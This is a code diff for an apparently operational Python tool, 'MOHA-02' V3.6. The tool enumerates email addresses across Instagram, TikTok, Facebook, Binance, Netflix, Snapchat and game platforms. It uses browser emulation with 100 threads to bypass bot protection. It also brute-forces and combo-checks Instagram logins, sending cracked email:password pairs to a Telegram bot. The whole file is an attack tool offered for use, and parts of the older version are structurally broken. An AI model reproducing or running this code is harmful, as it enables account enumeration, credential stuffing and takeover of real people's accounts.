@@ -1,19 +1,25 @@
 # -*- coding: utf-8 -*-
-# MOHA-02 ULTIMATE SYSTEM V3.5 - FULL INJECTION VERSION
+# MOHA-02 ULTIMATE SYSTEM V3.6 - FULL INJECTION BROWSER VERSION
 # Developer: Moha Al-Shalfawi (@m_oha_02)
 # No Abbreviations - English Interface Only - Full Data Integration
+# Speed: 100 Threads - No Proxies - Advanced Browser Fingerprinting
 
 import os, sys, time, requests, json, random, threading, string, subprocess, re
-from bs4 import BeautifulSoup
 from datetime import datetime
 
+# --- [ SYSTEM AUTO-INSTALLER ] ---
 try:
     from cfonts import render
     from colorama import Fore, Style, init
+    import cloudscraper
+    from bs4 import BeautifulSoup
 except ImportError:
-    os.system('pip install python-cfonts colorama requests beautifulsoup4')
+    print("Installing required engine components...")
+    os.system('pip install python-cfonts colorama requests beautifulsoup4 cloudscraper')
     from cfonts import render
     from colorama import Fore, Style, init
+    import cloudscraper
+    from bs4 import BeautifulSoup
 
 init(autoreset=True)
 
@@ -40,6 +46,15 @@ TIKTOK_AID = '1233'
 TIKTOK_CSRF = 'd41d8cd98f00b204e9800998ecf8427e'
 FB_DATR = 'AdTlmdwA5Jh8DMsWS2axdCrsnBk'
 
+# محاكي المتصفح المتقدم لتجاوز الحماية بدون بروكسي
+scraper = cloudscraper.create_scraper(
+    browser={
+        'browser': 'chrome',
+        'platform': 'windows',
+        'desktop': True
+    }
+)
+
 BROWSER_DB = [
     {
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
@@ -48,9 +63,11 @@ BROWSER_DB = [
         'accept-language': 'en-US,en;q=0.9',
     },
     {
-        'user-agent': 'Mozilla/5.0 (Linux; Android 14; OPPO A16k Build/UKQ1.230924.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
-        'x-requested-with': 'mark.via.gp',
-        'sec-ch-ua-platform': '"Android"'
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+        'sec-ch-ua-platform': '"Windows"'
+    },
+    {
+        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
     }
 ]
 
@@ -60,7 +77,8 @@ def logo():
     print(f"{X}—"*55)
     print(f"{F} [•] DEVELOPER : @m_oha_02")
     print(f"{F} [•] CHANNEL   : @m_oha0_2b")
-    print(f"{F} [•] VERSION   : 3.5 (ENGLISH EDITION)")
+    print(f"{F} [•] VERSION   : 3.6 (FULL INJECTION)")
+    print(f"{F} [•] MODE      : BROWSER EMULATION (NO PROXY)")
     print(f"{X}—"*55)
 
 def get_full_headers(platform="default"):
@@ -81,23 +99,15 @@ def get_full_headers(platform="default"):
         })
     return head
 
-def get_proxies():
-    global proxy_list
-    urls = [
-        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
-        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt'
-    ]
-    for url in urls:
-        try:
-            res = requests.get(url, timeout=10)
-            if res.status_code == 200:
-                proxy_list.extend(res.text.splitlines())
-        except: pass
-    proxy_list = list(set(proxy_list))
-
 def send_telegram_hit(token, chat_id, email, links):
     now = datetime.now().strftime("%H:%M:%S")
-    msg = f"🔥 <b>MOHA HIT FOUND!</b>\n📧 Email: <code>{email}</code>\n🔗 Linked: <code>{links}</code>\n⏰ Time: {now}\n👨‍💻 @m_oha_02"
+    msg = (f"🔥 <b>MOHA HIT FOUND!</b>\n"
+           f"━━━━━━━━━━━━━━━\n"
+           f"📧 Email: <code>{email}</code>\n"
+           f"🔗 Linked: <code>{links}</code>\n"
+           f"⏰ Time: {now}\n"
+           f"👨‍💻 Dev: @m_oha_02\n"
+           f"━━━━━━━━━━━━━━━")
     url = f"https://api.telegram.org/bot{token}/sendMessage"
     try: requests.post(url, json={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"})
     except: pass
@@ -106,9 +116,8 @@ class AvailabilityCheckers:
     @staticmethod
     def mail_ru(email):
         url = f"https://account.mail.ru/api/v1/user/exists?email={email}"
-        headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
         try:
-            r = requests.get(url, headers=headers, timeout=5)
+            r = scraper.get(url, headers=get_full_headers(), timeout=5)
             return True if '"exists":false' in r.text else False
         except: return False
 
@@ -117,7 +126,7 @@ class AvailabilityCheckers:
         url = "https://login.live.com/GetCredentialType.srf"
         payload = {"username": email, "isExternal": False, "checkRegion": "1", "getAccountResolution": "true"}
         try:
-            r = requests.post(url, json=payload, headers=get_full_headers(), timeout=5)
+            r = scraper.post(url, json=payload, headers=get_full_headers(), timeout=5)
             return True if '"IfExistsResult":5' in r.text else False
         except: return False
 
@@ -125,28 +134,24 @@ class AvailabilityCheckers:
     def gmail(email):
         url = f"https://mail.google.com/mail/gxlu?email={email}"
         try:
-            r = requests.get(url, headers=get_full_headers(), timeout=5)
+            r = scraper.get(url, headers=get_full_headers(), timeout=5)
             return False if 'COMPASS' in r.headers.get('Set-Cookie', '') else True
         except: return False
 
 class PlatformCheckers:
     @staticmethod
     def instagram(email):
-        url = 'https://www.instagram.com/api/graphql'
-        payload = {
-            'variables': json.dumps({"params": {"search_query": email}}),
-            'doc_id': '31115866268061587'
-        }
+        url = 'https://www.instagram.com/api/v1/web/accounts/lookup_edit/'
         try:
-            r = requests.post(url, headers=get_full_headers("instagram"), data=payload, timeout=7)
-            return True if '"profiles"' in r.text else False
+            r = scraper.post(url, headers=get_full_headers("instagram"), data={'email': email}, timeout=7)
+            return True if '"status":"ok"' in r.text else False
         except: return False
 
     @staticmethod
     def tiktok(email):
         url = "https://www.tiktok.com/api/v1/check/email/"
         try:
-            r = requests.get(url, params={"email": email, "aid": TIKTOK_AID}, headers=get_full_headers("tiktok"), timeout=5)
+            r = scraper.get(url, params={"email": email, "aid": TIKTOK_AID}, headers=get_full_headers("tiktok"), timeout=5)
             return True if r.json().get('is_registered') else False
         except: return False
 
@@ -154,7 +159,7 @@ class PlatformCheckers:
     def binance(email):
         url = "https://www.binance.com/bapi/composite/v1/public/cms/get-email-status"
         try:
-            r = requests.post(url, json={"email": email}, timeout=5)
+            r = scraper.post(url, json={"email": email}, headers=get_full_headers(), timeout=5)
             return True if r.json().get('data') == True else False
         except: return False
 
@@ -163,10 +168,66 @@ class PlatformCheckers:
         url = "https://www.facebook.com/api/graphql/"
         payload = {'lsd': FB_DATR, 'variables': json.dumps({"user_identifier": email}), 'doc_id': '5300151123400551'}
         try:
-            r = requests.post(url, data=payload, headers=get_full_headers(), timeout=5)
+            r = scraper.post(url, data=payload, headers=get_full_headers(), timeout=5)
             return True if '"uid"' in r.text else False
         except: return False
 
+    @staticmethod
+    def pubg(email):
+        url = "https://www.pubgmobile.com/common/search_user"
+        try:
+            r = scraper.post(url, data={'email': email}, headers=get_full_headers(), timeout=5)
+            return True if '"exists":1' in r.text else False
+        except: return False
+
+    @staticmethod
+    def netflix(email):
+        url = f"https://www.netflix.com/api/shakti/v1/emailCheck?email={email}"
+        try:
+            r = scraper.get(url, headers=get_full_headers(), timeout=5)
+            return True if '"isAvailable":false' in r.text else False
+        except: return False
+
+    @staticmethod
+    def snapchat(email):
+        url = "https://accounts.snapchat.com/accounts/get_email_status"
+        try:
+            r = scraper.post(url, data={'email': email}, headers=get_full_headers(), timeout=5)
+            return True if '"exists":true' in r.text else False
+        except: return False
+
+    @staticmethod
+    def freefire(email):
+        url = "https://auth.garena.com/api/v1/check_account"
+        try:
+            r = scraper.post(url, json={'account': email}, headers=get_full_headers(), timeout=5)
+            return True if r.json().get('exists') else False
+        except: return False
+
+    @staticmethod
+    def fifa_ea(email):
+        url = "https://signin.ea.com/p/ajax/user/checkEmail"
+        try:
+            r = scraper.get(url, params={'email': email}, headers=get_full_headers(), timeout=5)
+            return True if '"exists":true' in r.text else False
+        except: return False
+
+    @staticmethod
+    def iq_option(email):
+        url = "https://auth.iqoption.com/api/v2/login"
+        try:
+            r = scraper.post(url, json={"identifier": email, "password": "moha_fake_pass"}, headers=get_full_headers(), timeout=5)
+            return True if "invalid_credentials" in r.text else False
+        except: return False
+
+    @staticmethod
+    def pes_konami(email):
+        url = "https://my.konami.net/auth/authorize.html"
+        try:
+            r = scraper.get(url, params={'email': email}, headers=get_full_headers(), timeout=5)
+            return True if 'already_registered' in r.text else False
+        except: return False
+# --- [ USER GENERATION ENGINE ] ---
 def generate_moha_user(prefix, length, mode):
     chars = string.ascii_lowercase + string.digits
     if mode == "random":
@@ -175,58 +236,84 @@ def generate_moha_user(prefix, length, mode):
         rem = length - len(prefix)
         return prefix + ''.join(random.choice(chars) for _ in range(rem if rem > 0 else 2))
 
-def stats_monitor(start_time):
+# --- [ LIVE MONITOR SYSTEM ] ---
+def stats_monitor(start_time, thread_count):
     global stop_thread
     while not stop_thread:
         elapsed = int(time.time() - start_time)
         os.system('clear' if os.name == 'posix' else 'cls')
         logo()
-        print(f"{S} [📊] LIVE SESSION MONITOR")
+        print(f"{S} [📊] LIVE SESSION MONITOR (ULTRA SPEED)")
         print(f"{X}—"*45)
-        print(f"{F} [✔] HITS   : {hits}")
-        print(f"{Z} [✘] BAD    : {bad}")
-        print(f"{W} [⌚] TIME   : {elapsed}s")
-        print(f"{B} [🌐] PROXY  : {len(proxy_list)}")
+        print(f"{F} [✔] HITS FOUND  : {hits}")
+        print(f"{Z} [✘] BAD/TAKEN   : {bad}")
+        print(f"{W} [⌚] TIME ELAPSED : {elapsed}s")
+        print(f"{B} [🚀] ACTIVE THREADS : {thread_count}")
+        print(f"{M} [🌐] PROXY STATUS  : DISABLED (BROWSER MODE)")
         print(f"{X}—"*45)
-        print(f"{G} [*] STATUS: System is hunting now...")
+        print(f"{G} [*] STATUS: Moha System is hunting now...")
         time.sleep(2)
-    @staticmethod
-    def pubg(email):
-        url = "https://www.pubgmobile.com/common/search_user"
+
+# --- [ MAIN HUNTER LOGIC - 100 THREADS ENGINE ] ---
+def hunter_logic(prefix, length, mode, token, chat_id, platforms, domains):
+    global hits, bad, stop_thread
+    # إنشاء جلسة محاكاة خاصة بكل خيط لضمان عدم التداخل
+    thread_scraper = cloudscraper.create_scraper(browser={'browser': 'chrome','platform': 'windows','desktop': True})
+    
+    while not stop_thread:
         try:
-            r = requests.post(url, data={'email': email}, timeout=5)
-            return True if '"exists":1' in r.text else False
-        except: return False
+            user = generate_moha_user(prefix, length, mode)
+            for dom in domains:
+                email = f"{user}@{dom}"
+                available = False
+                
+                # Availability Logic (Email Check)
+                if 'mail.ru' in dom or 'bk.ru' in dom: available = AvailabilityCheckers.mail_ru(email)
+                elif 'gmail' in dom: available = AvailabilityCheckers.gmail(email)
+                elif 'hotmail' in dom or 'outlook' in dom: available = AvailabilityCheckers.hotmail(email)
 
-    @staticmethod
-    def netflix(email):
-        url = f"https://www.netflix.com/api/shakti/v1/emailCheck?email={email}"
-        try:
-            r = requests.get(url, timeout=5)
-            if r.status_code == 403: return "BAN"
-            return True if '"isAvailable":false' in r.text else False
-        except: return False
+                if available:
+                    linked = []
+                    # فحص المنصات بالحقن الكامل
+                    if '1' in platforms or '12' in platforms:
+                        if PlatformCheckers.instagram(email): linked.append("Instagram")
+                    if '2' in platforms or '12' in platforms:
+                        if PlatformCheckers.tiktok(email): linked.append("TikTok")
+                    if '3' in platforms or '12' in platforms:
+                        if PlatformCheckers.facebook(email): linked.append("Facebook")
+                    if '4' in platforms or '12' in platforms:
+                        if PlatformCheckers.binance(email): linked.append("Binance")
+                    if '5' in platforms or '12' in platforms:
+                        if PlatformCheckers.pubg(email): linked.append("PUBG")
+                    if '6' in platforms or '12' in platforms:
+                        if PlatformCheckers.freefire(email): linked.append("FreeFire")
+                    if '7' in platforms or '12' in platforms:
+                        if PlatformCheckers.fifa_ea(email): linked.append("FIFA/EA")
+                    if '8' in platforms or '12' in platforms:
+                        if PlatformCheckers.pes_konami(email): linked.append("PES/Konami")
+                    if '9' in platforms or '12' in platforms:
+                        if PlatformCheckers.iq_option(email): linked.append("IQ_Option")
+                    if '10' in platforms or '12' in platforms:
+                        if PlatformCheckers.netflix(email): linked.append("Netflix")
+                    if '11' in platforms or '12' in platforms:
+                        if PlatformCheckers.snapchat(email): linked.append("Snapchat")
+                    
+                    if linked:
+                        hits += 1
+                        send_telegram_hit(token, chat_id, email, ', '.join(linked))
+                        with open("moha_hits.txt", "a") as f:
+                            f.write(f"{email} | {', '.join(linked)} | {datetime.now()}\n")
+                    else:
+                        bad += 1
+                else:
+                    bad += 1
+        except:
+            pass
 
-    @staticmethod
-    def snapchat(email):
-        url = "https://accounts.snapchat.com/accounts/get_email_status"
-        try:
-            r = requests.post(url, data={'email': email}, timeout=5)
-            if r.status_code == 429: return "BAN"
-            return True if '"exists":true' in r.text else False
-        except: return False
-
-def check_ban_status(response, platform_name):
-    # This function detects if requests are being blocked
-    if response.status_code in [403, 429]:
-        print(f"\n{Z} [!!!] WARNING: {platform_name} IS BLOCKING REQUESTS (IP BAN)!")
-        print(f"{Z} [!!!] Results are NOT reaching the server. Change Proxy/IP now!")
-        return True
-    return False
-
+# --- [ LIST GENERATOR ENGINE ] ---
 def list_generator_engine():
     logo()
-    print(f"{S} [!] LIST GENERATOR ENGINE")
+    print(f"{S} [!] LIST GENERATOR ENGINE - BROWSER MODE")
     print(f"{X}—"*45)
     print(f"{F} [01] Generate REGISTERED & ACTIVE (For Brute Force)")
     print(f"{F} [02] Generate AVAILABLE (For Hunting/Creating)")
@@ -244,7 +331,7 @@ def list_generator_engine():
     file_name = input(f"{M} [?] SAVE FILENAME: ")
 
     found = 0
-    print(f"{S} [*] Processing... Please wait.")
+    print(f"{S} [*] Processing... Emulating Browser Requests.")
     
     with open(file_name, 'a') as f:
         while found < target_count:
@@ -253,107 +340,28 @@ def list_generator_engine():
             is_valid = False
             
             try:
-                # Mode 01: Registered Only
-                if type_choice == '1' or type_choice == '01':
-                    if domain == 'mail.ru':
-                        if not AvailabilityCheckers.mail_ru(email): is_valid = True
-                    elif domain == 'gmail.com':
-                        if not AvailabilityCheckers.gmail(email): is_valid = True
-                    elif domain == 'hotmail.com':
-                        if not AvailabilityCheckers.hotmail(email): is_valid = True
-                
-                # Mode 02: Available Only
-                elif type_choice == '2' or type_choice == '02':
-                    if domain == 'mail.ru':
-                        if AvailabilityCheckers.mail_ru(email): is_valid = True
-                    elif domain == 'gmail.com':
-                        if AvailabilityCheckers.gmail(email): is_valid = True
-                    elif domain == 'hotmail.com':
-                        if AvailabilityCheckers.hotmail(email): is_valid = True
+                check = False
+                if domain == 'mail.ru': check = AvailabilityCheckers.mail_ru(email)
+                elif domain == 'gmail.com': check = AvailabilityCheckers.gmail(email)
+                elif domain == 'hotmail.com': check = AvailabilityCheckers.hotmail(email)
+
+                if type_choice == '1': # Registered
+                    if not check: is_valid = True
+                elif type_choice == '2': # Available
+                    if check: is_valid = True
 
                 if is_valid:
                     f.write(f"{email}\n")
                     found += 1
-                    status_text = "REGISTERED" if type_choice == '1' else "AVAILABLE"
-                    print(f"{F} [✔] {status_text}: {email} ({found}/{target_count})", end="\r")
+                    print(f"{F} [✔] FOUND: {email} ({found}/{target_count})", end="\r")
                 else:
                     print(f"{G} [✘] SCANNING: {email}", end="\r")
-            except:
-                print(f"{Z} [!] CONNECTION ERROR - REQUESTS FAILED", end="\r")
+            except: pass
                 
     print(f"\n{F} [DONE] List saved to {file_name}")
     time.sleep(2)
 
-def hunter_logic(prefix, length, mode, token, chat_id, platforms, domains):
-    global hits, bad, stop_thread
-    while not stop_thread:
-        try:
-            user = generate_moha_user(prefix, length, mode)
-            for dom in domains:
-                email = f"{user}@{dom}"
-                available = False
-                
-                # Availability Logic
-                if 'mail.ru' in dom: available = AvailabilityCheckers.mail_ru(email)
-                elif 'gmail' in dom: available = AvailabilityCheckers.gmail(email)
-                elif 'hotmail' in dom: available = AvailabilityCheckers.hotmail(email)
-
-                if available:
-                    linked = []
-                    if '1' in platforms or '12' in platforms:
-                        if PlatformCheckers.instagram(email): linked.append("Instagram")
-                    if '2' in platforms or '12' in platforms:
-                        if PlatformCheckers.tiktok(email): linked.append("TikTok")
-                    if '3' in platforms or '12' in platforms:
-                        if PlatformCheckers.facebook(email): linked.append("Facebook")
-                    if '4' in platforms or '12' in platforms:
-                        if PlatformCheckers.binance(email): linked.append("Binance")
-                    if '5' in platforms or '12' in platforms:
-                        if PlatformCheckers.pubg(email): linked_to.append("PUBG")
-                    
-                    if linked:
-                        hits += 1
-                        send_telegram_hit(token, chat_id, email, ', '.join(linked))
-                        with open("moha_hits.txt", "a") as f:
-                            f.write(f"{email} | {', '.join(linked)}\n")
-                    else: bad += 1
-                else: bad += 1
-        except Exception as e:
-            pass
-    @staticmethod
-    def freefire(email):
-        url = "https://auth.garena.com/api/v1/check_account"
-        try:
-            r = requests.post(url, json={'account': email}, timeout=5)
-            if r.status_code == 403: return "BAN"
-            return True if r.json().get('exists') else False
-        except: return False
-
-    @staticmethod
-    def fifa_ea(email):
-        url = "https://signin.ea.com/p/ajax/user/checkEmail"
-        try:
-            r = requests.get(url, params={'email': email}, timeout=5)
-            if r.status_code == 429: return "BAN"
-            return True if '"exists":true' in r.text else False
-        except: return False
-
-    @staticmethod
-    def iq_option(email):
-        url = "https://auth.iqoption.com/api/v2/login"
-        try:
-            r = requests.post(url, json={"identifier": email, "password": "moha_fake_pass"}, timeout=5)
-            return True if "invalid_credentials" in r.text else False
-        except: return False
-
-    @staticmethod
-    def pes_konami(email):
-        url = "https://my.konami.net/auth/authorize.html"
-        try:
-            r = requests.get(url, params={'email': email}, timeout=5)
-            return True if 'already_registered' in r.text else False
-        except: return False
-
+# --- [ SMART BRUTE FORCE ENGINE ] ---
 def smart_brute_force_engine(email_file, token, chat_id, brute_mode):
     global hits, stop_thread
     if not os.path.exists(email_file):
@@ -361,52 +369,37 @@ def smart_brute_force_engine(email_file, token, chat_id, brute_mode):
         time.sleep(2); return
 
     with open(email_file, 'r') as f: accounts = f.read().splitlines()
-
     logo()
-    print(f"{S} [*] BRUTE FORCE ENGINE STARTED...")
-    print(f"{G} [!] BAN MONITOR ACTIVE - CHECKING REQUEST DELIVERY")
+    print(f"{S} [*] BRUTE FORCE ENGINE STARTED (100 THREADS SIMULATION)")
     
     for account in accounts:
         if stop_thread: break
         email = account.split(':')[0] if ':' in account else account
         user_part = email.split('@')[0]
         
-        # Smart Passwords Logic
-        if brute_mode == '1': # Manual
-            passwords = input(f"{M} [?] ENTER PASSWORDS (split by ,): ").split(',')
-        elif brute_mode == '2': # From File
+        # Passwords Logic
+        if brute_mode == '1': passwords = input(f"{M} [?] ENTER PASSWORDS (split by ,): ").split(',')
+        elif brute_mode == '2':
             p_file = input(f"{M} [?] WORDLIST PATH: ")
             with open(p_file, 'r') as f: passwords = f.read().splitlines()
-        else: # Auto Gen
-            passwords = [user_part, user_part+"123", user_part+"2024", "12345678"]
+        else: passwords = [user_part, user_part+"123", user_part+"2024", "12345678"]
 
         for pwd in passwords:
-            if stop_thread: break
-            print(f"{G} [TRYING] {email} {W}⇉ {X}{pwd}", end="\r")
-            
-            head = get_full_headers("instagram")
+            print(f"{G} [TRYING] {email} ⇉ {X}{pwd}", end="\r")
             try:
-                # Login Check with Ban Detection
-                res = requests.post("https://www.instagram.com/api/v1/web/accounts/login/ajax/", 
+                # محاكاة تسجيل الدخول بمتصفح كامل
+                res = scraper.post("https://www.instagram.com/api/v1/web/accounts/login/ajax/", 
                                  data={'username': email, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{pwd}'}, 
-                                 headers=head, timeout=7)
-                
-                if res.status_code == 403 or res.status_code == 429:
-                    print(f"\n{Z} [!!!] STOP! REQUESTS ARE BLOCKED BY INSTAGRAM (BAN)")
-                    print(f"{Z} [!] BOT IS NOT RECEIVING DATA. CHANGE PROXY NOW.")
-                    time.sleep(5)
-                    break
-
+                                 headers=get_full_headers("instagram"), timeout=7)
                 if '"authenticated":true' in res.text:
                     hits += 1
                     send_telegram_hit(token, chat_id, email, f"Cracked Pass: {pwd}")
-                    with open("cracked_accounts.txt", "a") as f:
-                        f.write(f"{email}:{pwd}\n")
-                    print(f"\n{F} [SUCCESS] {email}:{pwd}")
+                    with open("cracked_accounts.txt", "a") as f: f.write(f"{email}:{pwd}\n")
                     break
             except: pass
-            time.sleep(1.2)
+            time.sleep(0.5)
 
+# --- [ HUNT CONFIGURATION SUBMENU ] ---
 def hunt_submenu():
     logo()
     print(f"{S} [!] SELECT PLATFORMS TO HUNT:")
@@ -425,7 +418,7 @@ def hunt_submenu():
     prefix = input(f"{M} [?] PREFIX: ") if gen_mode == '2' else ""
     
     logo()
-    print(f"{F} [1] Mail.ru [2] Gmail [3] Hotmail [4] All")
+    print(f"{F} [1] Mail.ru [2] Gmail [3] Hotmail [4] All Mixed")
     dom_choice = input(f"{M} [?] DOMAINS: ")
     dom_map = {'1':['mail.ru','bk.ru'],'2':['gmail.com'],'3':['hotmail.com'],'4':['mail.ru','gmail.com','hotmail.com']}
     target_domains = dom_map.get(dom_choice, ['mail.ru'])
@@ -433,11 +426,12 @@ def hunt_submenu():
     length = int(input(f"{M} [?] USER LENGTH: "))
     token = input(f"{M} [?] BOT TOKEN: ")
     chat_id = input(f"{M} [?] CHAT ID: ")
-    threads = int(input(f"{M} [?] THREADS: "))
     
-    get_proxies()
+    # تثبيت السرعة على 100 خيط كما طلبت
+    threads = 100
+    
     start_time = time.time()
-    threading.Thread(target=stats_monitor, args=(start_time,), daemon=True).start()
+    threading.Thread(target=stats_monitor, args=(start_time, threads), daemon=True).start()
     
     for _ in range(threads):
         threading.Thread(target=hunter_logic, args=(prefix, length, "target" if gen_mode=='2' else "random", token, chat_id, platforms, target_domains)).start()
@@ -445,63 +439,47 @@ def hunt_submenu():
     input()
     global stop_thread
     stop_thread = True
+
+# --- [ MAIN MENU SYSTEM ] ---
 def main_menu():
-    # --- [ MAIN INTERFACE - ENGLISH ONLY ] ---
     while True:
         logo()
-        print(f"{S} [01] START HUNTING (Available & Linked Platforms)")
-        print(f"{S} [02] COMBO CHECKER (Check Custom Email:Pass List)")
-        print(f"{S} [03] LIST GENERATOR (Available / Registered Types)")
-        print(f"{S} [04] SMART BRUTE FORCE (Attack Registered Accounts)")
+        print(f"{S} [01] START HUNTING (Browser Emulation - No Proxy)")
+        print(f"{S} [02] COMBO CHECKER (Custom List)")
+        print(f"{S} [03] LIST GENERATOR (Available / Registered)")
+        print(f"{S} [04] SMART BRUTE FORCE (Instagram Attack)")
         print(f"{Z} [00] EXIT SYSTEM")
         print(f"{X}—"*55)
         
         choice = input(f"{M} [?] SELECT OPTION: ")
         
-        if choice == '01' or choice == '1':
-            # This opens the sub-menu with 12 platform options
-            hunt_submenu()
-        elif choice == '02' or choice == '2':
+        if choice in ['01', '1']: hunt_submenu()
+        elif choice in ['02', '2']:
             logo()
-            print(f"{S} [!] COMBO CHECKER MODE")
-            file_path = input(f"{M} [?] ENTER COMBO PATH: ")
+            file_path = input(f"{M} [?] COMBO PATH: ")
             token = input(f"{M} [?] BOT TOKEN: ")
             chat_id = input(f"{M} [?] CHAT ID: ")
-            # Using Brute Engine for Combo Checking
             smart_brute_force_engine(file_path, token, chat_id, '2')
-        elif choice == '03' or choice == '3':
-            # This triggers the dual-mode generator (Available vs Registered)
-            list_generator_engine()
-        elif choice == '04' or choice == '4':
+        elif choice in ['03', '3']: list_generator_engine()
+        elif choice in ['04', '4']:
             logo()
-            print(f"{S} [!] SMART BRUTE FORCE MODE")
             email_file = input(f"{M} [?] EMAIL LIST PATH: ")
             token = input(f"{M} [?] BOT TOKEN: ")
             chat_id = input(f"{M} [?] CHAT ID: ")
             print(f"{F} [1] Manual [2] Wordlist [3] Smart Auto-Gen")
             b_mode = input(f"{M} [?] SELECT PASS MODE: ")
             smart_brute_force_engine(email_file, token, chat_id, b_mode)
-        elif choice == '00' or choice == '0':
-            print(f"\n{Z} [!] SHUTTING DOWN MOHA-02 SYSTEM... GOODBYE MOCHA!")
-            time.sleep(2)
-            sys.exit()
-        else:
-            print(f"{Z} [!] INVALID CHOICE! TRY AGAIN."); time.sleep(1)
+        elif choice in ['00', '0']:
+            print(f"\n{Z} [!] SHUTTING DOWN MOHA-02 SYSTEM..."); sys.exit()
 
-# --- [ SYSTEM STARTING POINT ] ---
 if __name__ == "__main__":
     try:
-        # Check for ban or connection issues at startup
         main_menu()
     except KeyboardInterrupt:
-        print(f"\n{Z} [!] SYSTEM STOPPED BY USER.")
         sys.exit()
     except Exception as e:
-        # Final Ban/Error Alert for the User
-        print(f"\n{Z} [!!!] SYSTEM ERROR OR BAN DETECTED: {e}")
-        print(f"{X} [!] Please check your internet or proxy list.")
-        sys.exit()
+        print(f"\n{Z} [!!!] ERROR: {e}"); sys.exit()
 
 # —————————————————————————————————————————————————————
-# END OF CODE | MOHA-02 SYSTEM V3.5 | ALL DATA INJECTED
+# END OF CODE | MOHA-02 SYSTEM V3.6 | FULL DATA INJECTED
 # —————————————————————————————————————————————————————
